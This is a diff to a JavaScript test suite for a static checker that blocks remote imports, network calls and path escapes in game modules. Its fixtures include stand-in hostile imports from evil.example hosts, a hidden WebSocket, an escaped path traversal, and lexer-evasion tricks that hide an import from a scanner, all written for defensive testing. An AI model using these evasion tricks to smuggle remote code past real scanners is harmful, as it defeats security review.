@@ -166,6 +166,19 @@ run('a NON-LITERAL dynamic import cannot be judged, so it is refused', {
   files: { 'x.js': wrap("const p = './x' + api.entry.id + '.js'; import(p);") },
   expect: 'RED', expectText: 'non-literal',
 });
+/* A BARE SPECIFIER. PUP-WO-0113 acceptance 3 names four evasions the pattern must still
+ * catch after the repair, and this was the one with no control of its own — the remote
+ * URL, the no-whitespace form and the next-line specifier each had one, and "bare" was
+ * covered only incidentally by them sharing a message. A repair inherits none of the old
+ * assertion's credibility, so each is planted separately now. */
+run('a BARE specifier — no scheme, no dot, resolved by an import map that games/ has not got', {
+  files: { 'x.js': "import z from 'lodash-es';\n" + CLEAN },
+  expect: 'RED', expectText: 'not a relative path',
+});
+run('a bare specifier reached DYNAMICALLY', {
+  files: { 'x.js': wrap("import('some-package');") },
+  expect: 'RED', expectText: 'not a relative path',
+});
 
 console.log('\n=== PART C — the removal ladder. Removing ONE retires ONLY its finding ===');
 const FOUR = [
@@ -215,6 +228,306 @@ run('a LOCAL url( in CSS: backgroundImage = url("./bg.png")', {
   expect: 'GREEN',
 });
 
+console.log('\n=== PART D2 — PROSE IS NOT CODE. PUP-WO-0113: check 11 fired on English ===');
+console.log('    (it BLOCKED PUP-WO-0704, reporting an import in a file with no import in it)');
+
+/* THE EXACT REPRODUCTION, REDUCED TO ITS THREE PIECES AND KEPT AS ONE FIXTURE.
+ *
+ * On PUP-WO-0704's head, check 11 reported `games/blockpop.js:12 — import '.bp-flash'`
+ * in a module whose only module-level construct is `export default function mount`. The
+ * unbounded `[\s\S]*?` gap — which is unbounded DELIBERATELY, so that `import{x}` and a
+ * specifier on the next line are both seen — stitched the finding out of three pieces of
+ * English hundreds of lines apart:
+ *
+ *     `import`  the word "imports" in a comment
+ *     `from`    the word "from" in a DIFFERENT comment, much later
+ *     '…'       a markdown-style backtick pair around a CSS class name
+ *
+ * The gap is not the defect and is not touched. The defect was that the scan ran on the
+ * RAW source. This fixture keeps the three pieces far apart and in separate comments, so
+ * it fails the moment anything makes the scan read prose again. */
+run('THE PUP-WO-0704 REPRODUCTION: three pieces of English, in three comments, no code', {
+  files: { 'x.js':
+    '/* The shell imports with a bare specifier and no cache-buster, so the module\n'
+    + ' * object is evaluated once and shared. */\n'
+    + CLEAN
+    + '\n/* padding so the pieces are nowhere near each other. */\n'.repeat(40)
+    + '/* THE GRADIENT IS INVERTED from `.bp-flash`\'s — transparent at the centre. */\n' },
+  expect: 'GREEN',
+});
+run('a whole import STATEMENT written out inside a block comment', {
+  files: { 'x.js': "/* the old version did: import evil from 'https://e/m.js'; */\n" + CLEAN },
+  expect: 'GREEN',
+});
+run('a whole import STATEMENT written out inside a line comment', {
+  files: { 'x.js': "// import evil from 'https://e/m.js';\n" + CLEAN },
+  expect: 'GREEN',
+});
+run('an import statement inside a STRING LITERAL, not a comment', {
+  files: { 'x.js': wrap('host.textContent = "import evil from \'https://e/m.js\'";') },
+  expect: 'GREEN',
+});
+
+/* AND THE OTHER DIRECTION, WHICH IS THE ONE THAT MATTERS. Making prose invisible is
+ * worthless if it also makes CODE invisible: a stripper that is too eager turns a
+ * fail-closed gate into a green one, which is strictly worse than the false red it was
+ * fixed for. Every one of these is a REAL import that must still be caught, standing
+ * next to prose built to look exactly like it. */
+run('a REAL remote import on the SAME LINE as a comment that also looks like one', {
+  files: { 'x.js': "import z from 'https://e/m.js'; // import z from './safe.js'\n" + CLEAN },
+  expect: 'RED', expectText: 'not a relative path',
+});
+run('a real remote import AFTER a block comment containing a fake one', {
+  files: { 'x.js': "/* import z from './safe.js' */ import z from 'https://e/m.js';\n" + CLEAN },
+  expect: 'RED', expectText: 'not a relative path',
+});
+/* THE APOSTROPHE MUST BE THE CONFUSABLE DELIMITER, AND IN THE FIRST VERSION IT WAS NOT.
+ * That version put the apostrophe inside a DOUBLE-quoted string, which stresses no lexer
+ * at all, and parked the import after the whole wrap() body so even end-of-line damage
+ * could not reach it. The adversarial pass mutated strip() to the exact confusion the
+ * label names — terminate a string on EITHER quote character — and this control stayed
+ * GREEN while a DIFFERENT control caught the mutant. A plant that cannot fail on the
+ * defect it is named for is not a plant. The apostrophe is the ESCAPED delimiter of its
+ * own single-quoted string now, and the import is on the very next line. */
+run('a real remote import after a STRING whose escaped apostrophe could close it early', {
+  files: { 'x.js': "const s = 'it\\'s fine';\nimport z from 'https://e/m.js';\n" + CLEAN },
+  expect: 'RED', expectText: 'not a relative path',
+});
+run('a real remote import after a REGEX LITERAL containing a quote (the stripper\'s stated blind spot)', {
+  files: { 'x.js': "const RE = /['\"]/g;\nimport z from 'https://e/m.js';\n" + CLEAN },
+  expect: 'RED', expectText: 'not a relative path',
+});
+run('a real remote import after a template literal with a substitution and a quote', {
+  files: { 'x.js': "const t = `a${1}b'c`;\nimport z from 'https://e/m.js';\n" + CLEAN },
+  expect: 'RED', expectText: 'not a relative path',
+});
+
+/* THE REPORTED LINE, WHICH IS THE OTHER HALF OF §4's RULING. Position fidelity is why the
+ * scan reads raw at all, so a stripper that preserved everything except the line number
+ * would satisfy the letter of the fix and destroy what it was for: a diagnostic that says
+ * "somewhere in this file" costs the next reader an hour.
+ *
+ * AND IT WAS OFF BY ONE BEFORE THE REPAIR, for every import that starts a line —
+ * `(?:^|[;}\s])` consumes the NEWLINE ending the previous line, so the match began there.
+ * The keyword is captured and reported from now. */
+run('the reported LINE is the import keyword\'s own line, not the newline before it', {
+  files: { 'x.js': '// line 1\n// line 2\n// line 3\nimport z from \'https://e/m.js\';\n' + CLEAN },
+  expect: 'RED', expectText: 'x.js:4 —',
+});
+/* THE ANCHOR MOVED FROM THE KEYWORD TO THE SPECIFIER, AND ONLY FOR A SPLIT STATEMENT.
+ * V8 reports WHICH specifiers a module depends on, not where they are written, so the
+ * line comes from locating the quoted literal — which for `import z from\n  '…';` is
+ * line 4, not the keyword's 3. For every import written on one line, which is all of
+ * them in this repo, the two are the same and the previous control above pins it exactly.
+ * Recorded rather than quietly changed: acceptance 5 asks that a real import at a known
+ * line reports that line, and it does — the anchor is the path, which is the part of the
+ * statement the finding is about. */
+run('a specifier on the NEXT line is reported at the SPECIFIER, not the keyword', {
+  files: { 'x.js': '// line 1\n// line 2\nimport z from\n  \'https://e/m.js\';\n' + CLEAN },
+  expect: 'RED', expectText: 'x.js:4 —',
+});
+
+console.log('\n=== PART D3 — THE STRIPPER IS NOW LOAD-BEARING FOR IMPORTS. Four false GREENS ===');
+console.log('    (moving the import scan onto the stripped source made every strip() blind');
+console.log('     spot a way for a real remote import to pass. A green gate is worse than a');
+console.log('     false red, so each of these was RED before, GREEN after, and is RED again.)');
+
+/* Each fixture is a genuine `import z from 'https://…'` — the construct this gate exists
+ * for — preceded by ONE character sequence that used to make `strip()` lose its place and
+ * blank the rest of the file. A blanked file scans clean, so each of these passed.
+ * Verified individually: RED on the pre-PUP-WO-0113 scanner, GREEN on the first version
+ * of the repair, RED again now. The adversarial pass found three; the fourth is the same
+ * family and was found by testing its neighbours. */
+const REMOTE = "import z from 'https://e/m.js';\n" + CLEAN;
+run('a BACKTICK inside a regex literal used to open a template and blank to EOF', {
+  files: { 'x.js': 'const RE = /`/;\n' + REMOTE },
+  expect: 'RED', expectText: 'not a relative path',
+});
+run('a SLASH-STAR inside a character class used to open a block comment and blank to EOF', {
+  files: { 'x.js': 'const RE = /[/*]/;\n' + REMOTE },
+  expect: 'RED', expectText: 'not a relative path',
+});
+run('a QUOTE inside a regex literal used to open a string and blank the rest of the line', {
+  files: { 'x.js': "const RE = /'/g; " + REMOTE },
+  expect: 'RED', expectText: 'not a relative path',
+});
+/* U+2028 IS A LINE TERMINATOR IN JAVASCRIPT AND THE SCANNER ONLY STOPPED AT \n. The
+ * engine ends the comment there and executes the import; the scanner ran the comment on
+ * to the next real newline and blanked it. The character is in this fixture on purpose —
+ * ` ` here is a JS escape, so the file on disk holds the real one. */
+run('U+2028 ends a // comment for the ENGINE, and used not to for the scanner', {
+  files: { 'x.js': '// a comment ' + REMOTE },
+  expect: 'RED', expectText: 'not a relative path',
+});
+
+console.log('\n=== PART D4 — a regex literal is CODE whose contents are not ===');
+run('a forbidden token inside a REGEX LITERAL is not a call', {
+  files: { 'x.js': wrap("const RE = /fetch\\(|eval\\(/; host.textContent = RE.test('x') ? 'y' : 'n';") },
+  expect: 'GREEN',
+});
+run('an import STATEMENT spelled out inside a regex literal is not an import', {
+  files: { 'x.js': "const RE = / import.*from '/;\nconst s = 'hi';\n" + CLEAN },
+  expect: 'GREEN',
+});
+run('but a REAL forbidden token AFTER a regex literal on the SAME LINE is still caught', {
+  files: { 'x.js': wrap("const RE = /ab+c/g; fetch('https://e/x'); host.textContent = String(RE);") },
+  expect: 'RED', expectText: 'fetch',
+});
+run('DIVISION is not a regex: code after two divisions is still scanned', {
+  files: { 'x.js': wrap("const r = (a, b) => a / 2 + b / 3; fetch('https://e/x'); host.textContent = String(r(1,2));") },
+  expect: 'RED', expectText: 'fetch',
+});
+
+console.log('\n=== PART D5 — when the scanner loses its place it must REFUSE A VERDICT ===');
+console.log('    (a blanked file scans clean; reporting that green is the worst outcome here)');
+/* THE HEURISTIC CANNOT BE RIGHT ABOUT EVERY `/`, so the question is what happens when it
+ * is wrong. `strip()` reports `.broke` when a string, template, block comment or regex
+ * literal ran to end of file without closing — and check 11 has ALREADY proved the module
+ * parses as an ES module before it strips, so in a file that parses none of those is
+ * possible. An unterminated anything therefore means this scanner mis-lexed, and the
+ * honest answer is to refuse a verdict on that module rather than report the green a
+ * blanked file always gives. That is the replacement for the retired "read it by eye"
+ * note: a gate instead of a request. */
+/* A FILE THAT PARSES AND THAT THIS SCANNER CANNOT LEX — which is the only shape worth
+ * testing, because `scanModule` proves the module parses BEFORE it strips, so an
+ * unterminated construct in a file that does NOT parse is caught two branches earlier and
+ * proves nothing about `broke`. My first two attempts here were exactly that mistake and
+ * went RED for the wrong reason.
+ *
+ * `const x = {} / 2;` is valid JavaScript dividing an object literal, and `}` is in the
+ * set after which a `/` may begin a regex — so the heuristic opens a regex literal that
+ * never closes. THE HEURISTIC IS WRONG HERE AND THAT IS THE POINT: it cannot be right
+ * about every `/` without a parser, so what matters is what happens when it is wrong.
+ * It notices, and refuses a verdict on the module rather than reporting the green that a
+ * file blanked to EOF always produces. */
+run('a file this scanner cannot lex is a REFUSAL, not a pass', {
+  files: { 'x.js': 'const x = {} / 2;\nconst y = String(x);\n' + CLEAN },
+  expect: 'RED', expectText: 'lost its place',
+});
+
+console.log('\n=== PART D6 — a specifier this scanner cannot decode is not one it may clear ===');
+/* `im.spec` is the RAW source text between the quotes, escapes UNDECODED. This one begins
+ * "./", passes isRelative, and resolve() treats every character of the escape as an
+ * ordinary filename character — so the target stays inside games/ and the module was
+ * CLEARED. It decodes to ./a/../../evil.js. Refusing is what this check already does with
+ * a non-literal dynamic specifier, and for the same reason: it cannot be judged from text.
+ * Decoding it here would mean writing a second JavaScript string parser and trusting it. */
+/* IT IS JUDGED NOW RATHER THAN REFUSED, WHICH IS STRICTLY BETTER. When the specifier was
+ * the RAW text between the quotes, this could only be refused as undecodable — there was
+ * no honest way to say where it pointed without writing a second string parser.
+ * `dependencySpecifiers` hands over the DECODED string, so it arrives as
+ * `./a/../../evil.js` and is resolved like any other escaping path. A DYNAMIC specifier
+ * still comes from text and is still refused; that is the case below. */
+run('a relative-looking specifier that ESCAPES games/ via \\u002f is decoded and caught', {
+  files: { 'x.js': 'import z from "./a\\u002f..\\u002f..\\u002fevil.js";\n' + CLEAN },
+  expect: 'RED', expectText: 'OUTSIDE games/',
+});
+run('a DYNAMIC specifier written with an escape is still refused — V8 does not list those', {
+  files: { 'x.js': wrap('import("./a\\u002f..\\u002f..\\u002fevil.js");') },
+  expect: 'RED', expectText: 'cannot be decoded',
+});
+
+console.log('\n=== PART D7 — round two: three more false GREENS, and the mechanism change ===');
+console.log('    (a regex-versus-division heuristic cannot be made safe by refinement, so the');
+console.log('     static imports come from V8\'s own parse now. These pin what that closed.)');
+
+/* FG-A. THE ONE THAT FALSIFIED THE FILE'S OWN SAFETY ARGUMENT. `REGEX_KEYWORDS` was dead
+ * for every keyword written with a space after it — whitespace cleared `word`, so
+ * `has('')` was always false — so `return /re/` was read as DIVISION and the regex body
+ * was lexed as CODE. The `/*` inside the character class then opened a block comment that
+ * closed at the next `*` `/` ANYWHERE LATER IN THE FILE, blanking the import between them.
+ * `.broke` never fired because the comment closed tidily.
+ *
+ * The header claimed this direction could only ever produce a loud false RED. It is the
+ * SILENT direction: an unblanked regex has its body lexed as code. That was the third
+ * comment in a week asserting a safety property its code did not have, and it was the
+ * safety argument of the gate itself.
+ *
+ * THE FIXTURE READS LIKE ORDINARY GAME CODE, which is the point — every real module in
+ * this repo is full of block comments, so the closer is always there. */
+run('FG-A: a regex read as division opens a comment that swallows an import', {
+  files: { 'x.js': 'const S = (s) => {\n  return /[/*]\\s/.test(s) ? \'\' : s;\n};\n\n'
+    + "import confetti from 'https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm';\n\n"
+    + '/* an ordinary comment, of which every real module has many. */\n'
+    + 'export default function mount(host, api) {\n  host.textContent = S(\'x\');\n  return function teardown() {};\n}\n' },
+  expect: 'RED', expectText: 'not a relative path',
+});
+/* And the keyword set itself, which was dead in all real code: `return /re/` must be a
+ * regex, so a forbidden token spelled inside it is not a call. If the space bug comes
+ * back this goes RED with the regex body read as code. */
+run('FG-A root cause: a keyword followed by a SPACE still opens a regex', {
+  files: { 'x.js': wrap("const f = (s) => { return /fetch\\(/.test(s); }; host.textContent = String(f('x'));") },
+  expect: 'GREEN',
+});
+
+/* FG-B. NOT THE GAP, AND NOT THE STRIPPER. An `import` token with no quote of its own —
+ * `import.meta` or `import(` — forced the old lazy from-branch, whose `lastIndex` then
+ * jumped past a complete side-effect `import '…';` that has no `from`. The work order was
+ * right that the gap must not be BOUNDED; it turned out not to need keeping either. */
+run('FG-B: import.meta before a side-effect import', {
+  files: { 'x.js': "import.meta.url;\nimport 'https://evil.example/m.js';\nimport { helper } from './helper.js';\n" + CLEAN,
+           'helper.js': 'export const helper = 1;\n' },
+  expect: 'RED', expectText: 'not a relative path',
+});
+run('FG-B: a dynamic import before a side-effect import', {
+  files: { 'x.js': "import('./levels/l2.js');\nimport 'https://evil.example/m.js';\n" + CLEAN,
+           'levels/l2.js': 'export default 1;\n' },
+  expect: 'RED', expectText: 'not a relative path',
+});
+
+/* FG-C. A nested `{}` inside a `${}` substitution popped the stack early, so the rest of
+ * the substitution — real code — was blanked as template TEXT. An object literal or a
+ * block-bodied arrow is enough. The two notes that fired both said the token "appears
+ * only inside a comment or string", about executable code. */
+run('FG-C: a nested brace inside a template substitution hid a WebSocket', {
+  files: { 'x.js': 'export default function mount(host, api) {\n'
+    + "  host.innerHTML = `<i>${(() => { const o = {k:1}; const w = new WebSocket('wss://evil.example/s'); return o.k + w; })()}</i>`;\n"
+    + '  return function teardown() {};\n}\n' },
+  expect: 'RED', expectText: 'WebSocket',
+});
+run('and a template substitution containing an object literal is still ordinary code', {
+  files: { 'x.js': 'export default function mount(host, api) {\n'
+    + '  host.innerHTML = `<i>${JSON.stringify({ a: 1, b: { c: 2 } })}</i>`;\n'
+    + '  return function teardown() {};\n}\n' },
+  expect: 'GREEN',
+});
+
+console.log('\n=== PART D8 — the parse is the authority, and it cross-checks the lexer ===');
+/* V8 parsed the module two lines before the strip. It knows every static specifier
+ * exactly, so no arrangement of comments, regexes, templates or prose can hide one — and
+ * `strip()` is char-for-char, keeping a string's own quotes while blanking a comment
+ * entirely. So at the offset of a specifier's opening quote, an intact module still shows
+ * that quote in the stripped text and a swallowed one shows a space.
+ *
+ * That converts FG-A's whole class — a mis-lex that CLOSES tidily, which `.broke` cannot
+ * see — into a refusal, for the tier scans as well, since they read the same text. */
+/* THE NAMED RESIDUAL CLASS, PROVED TO FAIL LOUD — which is the property the last review
+ * asked for by name. `if (s) /re/` is the case the heuristic is documented as getting
+ * wrong: after `)` a slash is read as division, so the regex body is lexed as code, and a
+ * `/*` inside it opens a block comment that CLOSES at the next one later in the file.
+ * `.broke` cannot see that — the comment closed tidily — and before the cross-check the
+ * module reported clean. It refuses now. The heuristic is still wrong about this input
+ * and that is allowed; what is not allowed is being wrong quietly. */
+run('the class the heuristic may be wrong about fails LOUD, not silent', {
+  files: { 'x.js': "const t = (s) => { if (s) /[/*]\\s/.test(s); return s; };\n"
+    + "import ok from './helper.js';\n/* an ordinary comment. */\n"
+    + "export default function mount(host, api) { host.textContent = t('x') + ok; return function(){}; }\n",
+           'helper.js': 'export default 1;\n' },
+  expect: 'RED', expectText: 'blanked a real import',
+});
+/* AND IT MUST NOT FIRE ON ORDINARY CODE. `indexOf` takes the FIRST occurrence of the
+ * specifier, and a module that documents its own import path in a comment above the
+ * import has that first occurrence inside a blanked region — the first version of the
+ * cross-check refused every such module. This control found that, which is what it is
+ * for. The test is whether the specifier survives SOMEWHERE, not whether the first place
+ * it is written does. */
+run('a module that mentions its own import path in a comment must NOT refuse', {
+  files: { 'x.js': "/* we load './helper.js' here, see the comment above mount. */\n"
+    + "import ok from './helper.js';\n" + wrap('host.textContent = String(ok);'),
+           'helper.js': 'export default 1;\n' },
+  expect: 'GREEN',
+});
+
 console.log('\n=== PART E — the NOTES: they must fire when they should, and be quiet when they should not ===');
 console.log('    (a note lit on every green run carries no information, and the regex-literal');
 console.log('     note was lit on this repo\'s own game module, which contains no regex at all)');
@@ -228,10 +541,48 @@ run('ORDINARY DIVISION must NOT produce a regex-literal note', {
   expect: 'GREEN',
   noNoteText: 'REGEX LITERAL',
 });
-run('a REAL regex literal must still produce the note', {
+/* THE REGEX-LITERAL NOTE IS GONE AND ITS ABSENCE IS ASSERTED. It told a reader to check
+ * the module by eye because the scanner did not track regex literals. It does now, so
+ * that sentence became false — and a note warning about a hazard that has been closed
+ * trains people to ignore notes. What replaced it is the fail-closed refusal in PART D5,
+ * which is a gate rather than a request. If anyone puts the note back, this goes red. */
+run('a REAL regex literal must NOT produce the retired "read it by eye" note', {
   files: { 'x.js': wrap("const RE = /ab+c/g; host.textContent = RE.test('abc') ? 'y' : 'n';") },
   expect: 'GREEN',
-  noteText: 'REGEX LITERAL',
+  noNoteText: 'REGEX LITERAL',
+});
+/* THE SURVIVES-COMMENTS-BUT-NOT-STRIPPING NOTE, ALL FOUR DIRECTIONS — and the first
+ * version of it was baselined on the RAW source, which lit it on any module whose PROSE
+ * mentions an import. games/blockpop.js would have carried it on every green run forever,
+ * which is precisely the "a note lit on every green run carries no information" failure
+ * this file rewrote the regex note for. Baselined on `noComments` now: a mention in a
+ * comment is silent, and a construct that survives comment-removal and then vanishes did
+ * not vanish because it was prose. */
+run('an import mentioned only in a COMMENT must NOT produce it — that is ordinary prose', {
+  files: { 'x.js': "// import evil from 'https://e/m.js';\n" + CLEAN },
+  expect: 'GREEN',
+  noNoteText: 'vanish from the stripped source',
+});
+run('nor may the real prose from the module that started PUP-WO-0113', {
+  files: { 'x.js': '/* the shell imports with a bare specifier and no cache-buster. */\n'
+    + CLEAN + "\n/* THE GRADIENT IS INVERTED from `.bp-flash`'s. */\n" },
+  expect: 'GREEN',
+  noNoteText: 'vanish from the stripped source',
+});
+/* THE NOTE IS RETIRED AND ITS ABSENCE IS ASSERTED — the second one this work order has
+ * retired, and for the same reason both times: a gate replaced a request. It said "these
+ * lines match before stripping and not after, read them". The oracle cross-check answers
+ * that question with V8's own parse and REFUSES A VERDICT instead of asking a person to
+ * notice something. An import spelled out inside a string is ordinary and stays silent. */
+run('an import inside a STRING is ordinary and produces no note at all', {
+  files: { 'x.js': wrap('host.textContent = "we used to import evil from \'https://e/m.js\'";') },
+  expect: 'GREEN',
+  noNoteText: 'vanish from the stripped source',
+});
+run('and a module with no import-shaped text at all is silent', {
+  files: { 'x.js': CLEAN },
+  expect: 'GREEN',
+  noNoteText: 'vanish from the stripped source',
 });
 
 console.log('\n' + '='.repeat(78));
